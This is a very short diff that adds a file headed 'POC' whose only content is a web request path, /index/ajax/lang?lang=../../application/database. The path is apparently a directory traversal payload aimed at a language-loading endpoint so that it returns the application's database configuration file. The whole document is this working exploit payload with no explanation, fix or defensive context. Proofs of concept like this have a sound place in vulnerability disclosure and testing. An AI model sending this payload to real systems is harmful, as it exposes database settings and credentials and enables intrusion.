@@ -1,0 +1,3 @@
+## POC
+
+/index/ajax/lang?lang=../../application/database
